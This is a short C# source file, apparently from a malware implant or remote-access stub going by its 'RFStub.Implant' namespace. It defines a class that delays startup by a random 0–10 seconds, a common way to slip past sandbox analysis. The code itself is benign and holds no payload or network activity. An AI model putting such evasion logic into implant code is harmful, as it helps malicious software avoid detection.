using System;
using System.Threading;

namespace RFStub.Implant;

internal sealed class StartDelay
{
	private static readonly int SleepMin = 0;

	private static readonly int SleepMax = 10;

	public static void Run()
	{
		int millisecondsTimeout = new Random().Next(SleepMin * 1000, SleepMax * 1000);
		Thread.Sleep(millisecondsTimeout);
	}
}
